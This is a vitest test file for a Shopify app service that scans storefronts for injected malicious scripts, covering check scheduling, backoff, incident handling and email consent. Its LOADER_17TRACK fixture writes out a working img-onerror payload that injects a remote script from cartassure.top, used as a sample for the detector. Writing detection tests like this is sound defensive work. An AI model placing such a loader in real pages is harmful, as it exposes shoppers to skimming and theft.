/**
 * Checkout guard orchestration (gc-1q1s.5): due selection by plan cadence,
 * hash slot and backoff; one shop's check end to end over mocked storage and
 * a mocked storefront; isolation of failures.
 */
import { describe, it, expect, vi, beforeEach } from "vitest";

const model = vi.hoisted(() => ({
  loadGuard: vi.fn(),
  loadGuardIncidentsByFingerprint: vi.fn(),
  saveGuardCheck: vi.fn(),
  latestScanThemeHosts: vi.fn(),
  pruneGuardIncidents: vi.fn(),
  MAX_GUARD_INCIDENTS: 200,
  guardDomainsFrom: vi.fn(
    (d: { primaryHost: string; myshopifyHost: string | null }, now: Date) => ({
      ...d,
      domainsRefreshedAt: now,
    }),
  ),
}));
vi.mock("../../app/models/storefront-guard.server", () => model);
vi.mock("../../app/lib/logger.server", () => ({
  logger: { info: vi.fn(), warn: vi.fn(), error: vi.fn() },
}));

import { EMPTY_GUARD_STATE, type GuardIncident } from "../../app/lib/storefront-guard-state";
import type { StorefrontFetch } from "../../app/services/storefront-fetcher.server";
import {
  checkGuardShop,
  compareGuardCandidates,
  DAILY_CATCH_UP_MS,
  DAILY_MIN_GAP_MS,
  guardEmailConsentAt,
  guardHourSlot,
  HOURLY_MIN_GAP_MS,
  isGuardDue,
  mapPool,
} from "../../app/services/storefront-guard.server";
import type { AdminApiContext } from "../../app/types/shopify";

const NOW = new Date("2026-10-27T05:17:00Z");
const ago = (ms: number) => new Date(NOW.getTime() - ms);
const HOUR = 60 * 60 * 1000;
const DAY = 24 * HOUR;
/** A Standard shop that consented to guard email 30 days ago (gc-1q1s.10). */
const SHOP = {
  id: "shop-1",
  domain: "shop-1.myshopify.com",
  plan: "Standard",
  emailConsentAt: new Date(NOW.getTime() - 30 * 24 * 60 * 60 * 1000).toISOString(),
};

const STOREFRONT = (body: string) =>
  `<html><head><script>Shopify.shop = "shop-1.myshopify.com";</script></head><body>${body}</body></html>`;
const LOADER_17TRACK = `<nav><img src=x onerror="var s=document.createElement('script');s.src='https://cartassure.top/l2.js';document.head.appendChild(s)"></nav>`;

let fetchImpl: ReturnType<typeof vi.fn>;
const admin = {
  graphql: vi.fn(async () => ({
    json: async () => ({
      data: {
        shop: {
          primaryDomain: { url: "https://shop.example.com", host: "shop.example.com" },
          myshopifyDomain: "shop-1.myshopify.com",
        },
      },
    }),
  })),
} as unknown as AdminApiContext;
const deps = () => ({
  getAdmin: vi.fn(async () => admin),
  fetchOptions: { fetchImpl: fetchImpl as unknown as StorefrontFetch },
});

function loaded(over: Record<string, unknown> = {}) {
  return {
    version: 2,
    state: { ...EMPTY_GUARD_STATE, readableChecks: 3 },
    domains: {
      primaryHost: "shop.example.com",
      myshopifyHost: "shop-1.myshopify.com",
      domainsRefreshedAt: ago(HOURLY_MIN_GAP_MS),
    },
    incidents: [] as GuardIncident[],
    newHostsCapped: false,
    ...over,
  };
}

beforeEach(() => {
  vi.clearAllMocks();
  fetchImpl = vi.fn();
  model.latestScanThemeHosts.mockResolvedValue(new Set());
  model.pruneGuardIncidents.mockResolvedValue(0);
  model.loadGuardIncidentsByFingerprint.mockResolvedValue([]);
  model.saveGuardCheck.mockImplementation(async (input: { changed: GuardIncident[] }) => ({
    status: "saved",
    incidents: new Map(
      input.changed.map((i) => [i.fingerprint, { ...i, id: i.id ?? `id-${i.fingerprint}` }]),
    ),
  }));
});

describe("guardHourSlot", () => {
  it("is stable and in 0-23", () => {
    expect(guardHourSlot("shop-1")).toBe(guardHourSlot("shop-1"));
    for (const id of ["a", "b", "clx123", "x".repeat(40)]) {
      expect(guardHourSlot(id)).toBeGreaterThanOrEqual(0);
      expect(guardHourSlot(id)).toBeLessThan(24);
    }
  });

  it("spreads ids across the day", () => {
    const slots = new Set(Array.from({ length: 500 }, (_, i) => guardHourSlot(`shop-${i}`)));
    expect(slots.size).toBe(24);
  });
});

describe("isGuardDue", () => {
  const state = (lastCheckedAt: Date | null, backoffUntil: Date | null = null) => ({
    lastCheckedAt,
    backoffUntil,
  });

  it.each(["Standard", "Professional"])("%s is due hourly (50 min gap)", (plan) => {
    expect(isGuardDue({ id: "s", plan, storefrontGuardState: null }, NOW)).toBe(true);
    expect(
      isGuardDue({ id: "s", plan, storefrontGuardState: state(ago(HOURLY_MIN_GAP_MS)) }, NOW),
    ).toBe(true);
    expect(
      isGuardDue({ id: "s", plan, storefrontGuardState: state(ago(HOURLY_MIN_GAP_MS - 1)) }, NOW),
    ).toBe(false);
  });

  it("Free is due only in its hash hour slot, once a day", () => {
    const inSlot = Array.from({ length: 200 }, (_, i) => `f-${i}`).find(
      (id) => guardHourSlot(id) === NOW.getUTCHours(),
    )!;
    const outSlot = Array.from({ length: 200 }, (_, i) => `g-${i}`).find(
      (id) => guardHourSlot(id) !== NOW.getUTCHours(),
    )!;
    const last = state(ago(DAILY_MIN_GAP_MS));
    expect(isGuardDue({ id: inSlot, plan: "free", storefrontGuardState: last }, NOW)).toBe(true);
    expect(isGuardDue({ id: outSlot, plan: "free", storefrontGuardState: last }, NOW)).toBe(false);
    expect(
      isGuardDue(
        { id: inSlot, plan: "free", storefrontGuardState: state(ago(HOURLY_MIN_GAP_MS)) },
        NOW,
      ),
    ).toBe(false);
  });

  it("Free catches up in any hour after a missed slot", () => {
    expect(
      isGuardDue(
        { id: "anything", plan: "free", storefrontGuardState: state(ago(DAILY_CATCH_UP_MS)) },
        NOW,
      ),
    ).toBe(true);
    // A never-checked free shop is due at once (catch-up).
    expect(isGuardDue({ id: "anything", plan: "free", storefrontGuardState: null }, NOW)).toBe(
      true,
    );
  });

  it("never while in backoff, on any plan", () => {
    const backoff = state(ago(DAILY_CATCH_UP_MS), new Date(NOW.getTime() + 1));
    for (const plan of ["free", "Standard", "Professional"]) {
      expect(isGuardDue({ id: "s", plan, storefrontGuardState: backoff }, NOW)).toBe(false);
    }
  });
});

describe("checkGuardShop", () => {
  function storefront(home: string, cart = STOREFRONT("")) {
    fetchImpl.mockImplementation(async (url: URL) =>
      url.pathname === "/" ? new Response(home) : new Response(cart),
    );
  }

  it("opens a KNOWN_MALICIOUS incident for the 17TRACK menu loader on its first check", async () => {
    model.loadGuard.mockResolvedValue(loaded());
    storefront(STOREFRONT(LOADER_17TRACK));
    const out = await checkGuardShop(SHOP, NOW, deps());
    const openedItem = {
      shopId: "shop-1",
      incidentId: "id-KNOWN_MALICIOUS:cartassure.top",
      kind: "KNOWN_MALICIOUS",
      openedAt: NOW.toISOString(),
    };
    expect(out).toEqual({
      status: "checked",
      outcome: "ok",
      opened: [openedItem],
      toEmail: [openedItem],
    });
    const saved = model.saveGuardCheck.mock.calls[0][0];
    expect(saved.expectedVersion).toBe(2);
    expect(saved.changed[0]).toMatchObject({
      sourceLabel: "Named in JavaScript attached to an element in the page",
      page: "home",
    });
  });

  it("uses cached hosts without an Admin call while fresh", async () => {
    model.loadGuard.mockResolvedValue(loaded());
    storefront(STOREFRONT(""));
    const d = deps();
    await checkGuardShop(SHOP, NOW, d);
    expect(d.getAdmin).not.toHaveBeenCalled();
    expect(String(fetchImpl.mock.calls[0][0])).toBe("https://shop.example.com/");
  });

  it("refreshes hosts through the Admin API on the first check and caches them", async () => {
    model.loadGuard.mockResolvedValue(
      loaded({
        version: null,
        domains: { primaryHost: null, myshopifyHost: null, domainsRefreshedAt: null },
      }),
    );
    storefront(STOREFRONT(""));
    const d = deps();
    await checkGuardShop(SHOP, NOW, d);
    expect(d.getAdmin).toHaveBeenCalledWith("shop-1.myshopify.com");
    expect(model.saveGuardCheck.mock.calls[0][0].domains).toEqual({
      primaryHost: "shop.example.com",
      myshopifyHost: "shop-1.myshopify.com",
      domainsRefreshedAt: NOW,
    });
  });

  it("no usable hosts (Admin down, nothing cached) records an unreachable check, no fetch", async () => {
    model.loadGuard.mockResolvedValue(
      loaded({ domains: { primaryHost: null, myshopifyHost: null, domainsRefreshedAt: null } }),
    );
    const d = { ...deps(), getAdmin: vi.fn().mockRejectedValue(new Error("token")) };
    const out = await checkGuardShop(SHOP, NOW, d);
    expect(out).toMatchObject({ status: "checked", outcome: "unreachable:no_domain", opened: [] });
    expect(fetchImpl).not.toHaveBeenCalled();
  });

  it("keeps stale cached hosts when the refresh fails", async () => {
    model.loadGuard.mockResolvedValue(
      loaded({
        domains: {
          primaryHost: "shop.example.com",
          myshopifyHost: null,
          domainsRefreshedAt: ago(48 * 60 * 60 * 1000),
        },
      }),
    );
    storefront(STOREFRONT(""));
    const d = { ...deps(), getAdmin: vi.fn().mockRejectedValue(new Error("token")) };
    const out = await checkGuardShop(SHOP, NOW, d);
    expect(out).toMatchObject({ status: "checked", outcome: "ok" });
  });

  it("a password-protected store pauses: nothing opens", async () => {
    model.loadGuard.mockResolvedValue(loaded());
    fetchImpl.mockImplementation(async (url: URL) =>
      url.pathname === "/password"
        ? new Response("pw")
        : new Response(null, { status: 302, headers: { location: "/password" } }),
    );
    const out = await checkGuardShop(SHOP, NOW, deps());
    expect(out).toEqual({
      status: "checked",
      outcome: "paused_password",
      opened: [],
      toEmail: [],
    });
  });

  it("a blocked fetch (403) is unreachable and backs off at once", async () => {
    model.loadGuard.mockResolvedValue(loaded());
    fetchImpl.mockResolvedValue(new Response("no", { status: 403 }));
    const out = await checkGuardShop(SHOP, NOW, deps());
    expect(out).toMatchObject({ outcome: "unreachable:http_status" });
    expect(model.saveGuardCheck.mock.calls[0][0].state.backoffUntil).not.toBeNull();
  });

  it("theme-scan hosts are passed to the analyzer as known", async () => {
    model.loadGuard.mockResolvedValue(loaded());
    model.latestScanThemeHosts.mockResolvedValue(new Set(["widgets.vendor.io"]));
    storefront(STOREFRONT(`<script src="https://widgets.vendor.io/w.js"></script>`));
    await checkGuardShop(SHOP, NOW, deps());
    const saved = model.saveGuardCheck.mock.calls[0][0];
    expect(saved.state.recentHostSets).toEqual([[]]);
  });

  it("a lost write race returns stale and reports no openings", async () => {
    model.loadGuard.mockResolvedValue(loaded());
    model.saveGuardCheck.mockResolvedValue({ status: "stale" });
    storefront(STOREFRONT(LOADER_17TRACK));
    expect(await checkGuardShop(SHOP, NOW, deps())).toEqual({ status: "stale", outcome: "ok" });
  });

  it("never throws: a database failure is a failed shop", async () => {
    model.loadGuard.mockRejectedValue(new Error("db down"));
    expect(await checkGuardShop(SHOP, NOW, deps())).toEqual({ status: "failed" });
  });

  // Audit fix (M5): stamped with the run's fire time, not the chunk's clock.
  it("stamps lastCheckedAt with the run's fire time", async () => {
    const runAt = ago(40 * 60 * 1000);
    model.loadGuard.mockResolvedValue(
      loaded({ state: { ...EMPTY_GUARD_STATE, lastCheckedAt: ago(HOUR) } }),
    );
    storefront(STOREFRONT(""));
    await checkGuardShop(SHOP, NOW, deps(), runAt);
    const saved = model.saveGuardCheck.mock.calls[0][0];
    expect(saved.state.lastCheckedAt).toEqual(runAt);
    // The readable time is still the real check time.
    expect(saved.state.lastReadableAt).toEqual(NOW);
  });

  // Audit fix: a retried chunk step never checks (or counts) a shop twice.
  it("skips a shop already checked in this run (a retried chunk step)", async () => {
    const runAt = ago(10 * 60 * 1000);
    model.loadGuard.mockResolvedValue(
      loaded({ state: { ...EMPTY_GUARD_STATE, lastCheckedAt: runAt } }),
    );
    expect(await checkGuardShop(SHOP, NOW, deps(), runAt)).toEqual({ status: "already_checked" });
    expect(fetchImpl).not.toHaveBeenCalled();
    expect(model.saveGuardCheck).not.toHaveBeenCalled();
  });

  // Audit fix (M7): resolved rows are pruned per shop after each check.
  it("prunes old resolved incidents after a saved check, past the cap only when the load hit it", async () => {
    model.loadGuard.mockResolvedValue(loaded());
    storefront(STOREFRONT(""));
    await checkGuardShop(SHOP, NOW, deps());
    expect(model.pruneGuardIncidents).toHaveBeenCalledWith("shop-1", NOW, false);

    const full = Array.from({ length: 200 }, (_, i) => ({
      fingerprint: `NEW_SCRIPT_HOST:h${i}.example`,
      kind: "NEW_SCRIPT_HOST",
      host: `h${i}.example`,
      page: "home",
      sourceLabel: "x",
      state: "resolved",
      openedAt: ago(DAY),
      firstSeenAt: ago(DAY),
      lastSeenAt: ago(DAY),
      seenCount: 1,
      cleanStreak: 2,
      resolvedAt: ago(DAY),
      resolution: "clean",
      acknowledgedAt: null,
      emailedOpenedAt: null,
      id: `r${i}`,
    })) as GuardIncident[];
    model.loadGuard.mockResolvedValue(loaded({ incidents: full, newHostsCapped: true }));
    await checkGuardShop(SHOP, NOW, deps());
    expect(model.pruneGuardIncidents).toHaveBeenLastCalledWith("shop-1", NOW, true);
  });

  // Wave 3 B1: an open, emailed episode the load's cap hid, sighted again.
  it("a re-sighted row the load did not return keeps its episode: no reopen, no second email", async () => {
    const openedAt = ago(3 * HOUR);
    const hidden = {
      id: "inc-hidden",
      kind: "KNOWN_MALICIOUS",
      fingerprint: "KNOWN_MALICIOUS:cartassure.top",
      host: "cartassure.top",
      page: "home",
      sourceLabel: "Named in JavaScript attached to an element in the page",
      state: "open",
      openedAt,
      firstSeenAt: openedAt,
      lastSeenAt: ago(HOUR),
      seenCount: 3,
      cleanStreak: 0,
      resolvedAt: null,
      resolution: null,
      acknowledgedAt: null,
      emailedOpenedAt: openedAt,
    } as GuardIncident;
    model.loadGuard.mockResolvedValue(loaded());
    model.loadGuardIncidentsByFingerprint.mockResolvedValue([hidden]);
    storefront(STOREFRONT(LOADER_17TRACK));
    const out = await checkGuardShop(SHOP, NOW, deps());
    expect(model.loadGuardIncidentsByFingerprint).toHaveBeenCalledWith(
      "shop-1",
      expect.arrayContaining(["KNOWN_MALICIOUS:cartassure.top"]),
    );
    expect(out).toMatchObject({ status: "checked", opened: [], toEmail: [] });
    const written = model.saveGuardCheck.mock.calls[0][0].changed[0];
    expect(written).toMatchObject({ id: "inc-hidden", openedAt, emailedOpenedAt: openedAt });
    expect(written.seenCount).toBe(4);
  });

  it("asks only for sighted fingerprints the load did not already return", async () => {
    model.loadGuard.mockResolvedValue(loaded());
    storefront(STOREFRONT(""));
    await checkGuardShop(SHOP, NOW, deps());
    expect(model.loadGuardIncidentsByFingerprint).toHaveBeenCalledWith("shop-1", []);
  });

  it("a failed prune never fails the check", async () => {
    model.loadGuard.mockResolvedValue(loaded());
    model.pruneGuardIncidents.mockRejectedValue(new Error("db busy"));
    storefront(STOREFRONT(""));
    expect(await checkGuardShop(SHOP, NOW, deps())).toMatchObject({ status: "checked" });
  });

  it("a lost race prunes nothing", async () => {
    model.loadGuard.mockResolvedValue(loaded());
    model.saveGuardCheck.mockResolvedValue({ status: "stale" });
    storefront(STOREFRONT(""));
    await checkGuardShop(SHOP, NOW, deps());
    expect(model.pruneGuardIncidents).not.toHaveBeenCalled();
  });
});

describe("checkGuardShop: host cap log (gc-njwa #4)", () => {
  it("logs a count (never the hosts) when MAX_HOSTS_PER_CHECK drops candidates", async () => {
    const { logger } = await import("../../app/lib/logger.server");
    const { MAX_HOSTS_PER_CHECK } = await import("../../app/lib/storefront-guard-state");
    model.loadGuard.mockResolvedValue(loaded());
    const scripts = Array.from(
      { length: MAX_HOSTS_PER_CHECK + 5 },
      (_, n) =>
        `<script src="https://h${String(n).padStart(4, "0")}.vendor-cap.example/a.js"></script>`,
    ).join("");
    fetchImpl.mockImplementation(async () => new Response(STOREFRONT(scripts)));
    await checkGuardShop(SHOP, NOW, deps());
    const capped = vi
      .mocked(logger.warn)
      .mock.calls.filter(
        ([, ctx]) => (ctx as { event?: string }).event === "storefront_guard_hosts_capped",
      );
    expect(capped).toHaveLength(1);
    expect(capped[0][1]).toEqual({
      function: "storefront-guard",
      event: "storefront_guard_hosts_capped",
      shopId: "shop-1",
      droppedHosts: 5,
      maxHosts: MAX_HOSTS_PER_CHECK,
    });
    expect(JSON.stringify(capped)).not.toContain("vendor-cap.example");
  });

  it("logs nothing under the cap", async () => {
    const { logger } = await import("../../app/lib/logger.server");
    model.loadGuard.mockResolvedValue(loaded());
    fetchImpl.mockImplementation(
      async () =>
        new Response(STOREFRONT(`<script src="https://one.vendor.example/a.js"></script>`)),
    );
    await checkGuardShop(SHOP, NOW, deps());
    expect(
      vi
        .mocked(logger.warn)
        .mock.calls.some(
          ([, ctx]) => (ctx as { event?: string }).event === "storefront_guard_hosts_capped",
        ),
    ).toBe(false);
  });
});

describe("mapPool", () => {
  it("keeps input order and never exceeds the limit", async () => {
    let inFlight = 0;
    let peak = 0;
    const out = await mapPool([5, 1, 4, 2, 3, 0, 6], 3, async (n) => {
      inFlight++;
      peak = Math.max(peak, inFlight);
      await new Promise((r) => setTimeout(r, n));
      inFlight--;
      return n * 10;
    });
    expect(out).toEqual([50, 10, 40, 20, 30, 0, 60]);
    expect(peak).toBeLessThanOrEqual(3);
  });

  it("handles an empty list", async () => {
    expect(await mapPool([], 5, async () => 1)).toEqual([]);
  });
});

describe("checkGuardShop: what the email step is offered (audit fix)", () => {
  const openMal = (over: Partial<GuardIncident> = {}): GuardIncident => ({
    id: "inc-m",
    kind: "KNOWN_MALICIOUS",
    fingerprint: "KNOWN_MALICIOUS:cartassure.top",
    host: "cartassure.top",
    page: "home",
    sourceLabel: "Loaded by a script tag in the page",
    state: "open",
    openedAt: ago(2 * 60 * 60 * 1000),
    firstSeenAt: ago(2 * 60 * 60 * 1000),
    lastSeenAt: ago(60 * 60 * 1000),
    seenCount: 2,
    cleanStreak: 0,
    resolvedAt: null,
    resolution: null,
    acknowledgedAt: null,
    emailedOpenedAt: null,
    ...over,
  });
  function quietStorefront() {
    fetchImpl.mockImplementation(async () => new Response(STOREFRONT("")));
  }

  it("re-offers an unemailed episode from an earlier run (a failed send is retried)", async () => {
    model.loadGuard.mockResolvedValue(loaded({ incidents: [openMal()] }));
    quietStorefront();
    const out = await checkGuardShop(SHOP, NOW, deps());
    expect(out.status === "checked" && out.opened).toEqual([]);
    expect(out.status === "checked" && out.toEmail.map((i) => i.incidentId)).toEqual(["inc-m"]);
  });

  it("never offers an emailed episode, an old one, a new host, or a Free shop's", async () => {
    model.loadGuard.mockResolvedValue(
      loaded({
        incidents: [
          openMal({ id: "a", fingerprint: "a", emailedOpenedAt: ago(2 * 60 * 60 * 1000) }),
          openMal({ id: "b", fingerprint: "b", openedAt: ago(25 * 60 * 60 * 1000) }),
          openMal({ id: "c", fingerprint: "NEW_SCRIPT_HOST:x.io", kind: "NEW_SCRIPT_HOST" }),
        ],
      }),
    );
    quietStorefront();
    const out = await checkGuardShop(SHOP, NOW, deps());
    expect(out.status === "checked" && out.toEmail).toEqual([]);
    model.loadGuard.mockResolvedValue(loaded({ incidents: [openMal()] }));
    const free = await checkGuardShop({ ...SHOP, plan: "free" }, NOW, deps());
    expect(free.status === "checked" && free.toEmail).toEqual([]);
  });

  // gc-1q1s.10 / gc-njwa #6: no consent (never shown, turned off, unsubscribed)
  // means no notify step at all, so nothing is offered.
  it("offers nothing to a paid shop without consent", async () => {
    model.loadGuard.mockResolvedValue(loaded({ incidents: [openMal()] }));
    quietStorefront();
    for (const emailConsentAt of [null, undefined]) {
      const out = await checkGuardShop({ ...SHOP, emailConsentAt }, NOW, deps());
      expect(out.status === "checked" && out.toEmail).toEqual([]);
    }
  });

  // Owner-pending assumption: an incident still open when consent is given is
  // offered for 24 h from the LATER of its opening and the consent.
  it("an incident open before consent is offered for 24 h from the consent", async () => {
    const openedLongAgo = openMal({ openedAt: ago(5 * DAY), firstSeenAt: ago(5 * DAY) });
    model.loadGuard.mockResolvedValue(loaded({ incidents: [openedLongAgo] }));
    quietStorefront();
    const justConsented = { ...SHOP, emailConsentAt: ago(2 * HOUR).toISOString() };
    const out = await checkGuardShop(justConsented, NOW, deps());
    expect(out.status === "checked" && out.toEmail.map((i) => i.incidentId)).toEqual(["inc-m"]);

    const consentedYesterday = { ...SHOP, emailConsentAt: ago(25 * HOUR).toISOString() };
    const late = await checkGuardShop(consentedYesterday, NOW, deps());
    expect(late.status === "checked" && late.toEmail).toEqual([]);
  });

  it("never offers a resolved incident, whenever consent came", async () => {
    model.loadGuard.mockResolvedValue(
      loaded({
        incidents: [openMal({ state: "resolved", resolvedAt: ago(HOUR), resolution: "clean" })],
      }),
    );
    quietStorefront();
    const out = await checkGuardShop(
      { ...SHOP, emailConsentAt: ago(HOUR).toISOString() },
      NOW,
      deps(),
    );
    expect(out.status === "checked" && out.toEmail).toEqual([]);
  });
});

describe("guardEmailConsentAt (gc-1q1s.10)", () => {
  const base = {
    alertsEnabled: true,
    guardEmailNoticeShownAt: ago(DAY),
    guardEmailOffAt: null as Date | null,
  };
  it("is the consent stamp while email may be sent", () => {
    expect(guardEmailConsentAt(base)).toEqual(ago(DAY));
  });
  it("is null when never shown, turned off or unsubscribed", () => {
    expect(guardEmailConsentAt({ ...base, guardEmailNoticeShownAt: null })).toBeNull();
    expect(guardEmailConsentAt({ ...base, guardEmailOffAt: ago(HOUR) })).toBeNull();
    expect(guardEmailConsentAt({ ...base, alertsEnabled: false })).toBeNull();
  });
});

describe("compareGuardCandidates (wave 3 B7)", () => {
  const shop = (id: string, plan: string, lastCheckedAt: Date | null) => ({
    id,
    plan,
    storefrontGuardState: lastCheckedAt ? { lastCheckedAt } : null,
  });
  it("hourly plans first, then never checked, then the longest waiting", () => {
    const list = [
      shop("free-old", "free", ago(3 * DAY)),
      shop("std-recent", "Standard", ago(HOUR)),
      shop("free-never", "free", null),
      shop("pro-old", "Professional", ago(2 * HOUR)),
      shop("std-never", "Standard", null),
      shop("free-never-2", "free", null),
    ];
    expect([...list].sort(compareGuardCandidates).map((s) => s.id)).toEqual([
      "std-never",
      "pro-old",
      "std-recent",
      "free-never",
      "free-never-2",
      "free-old",
    ]);
  });
});
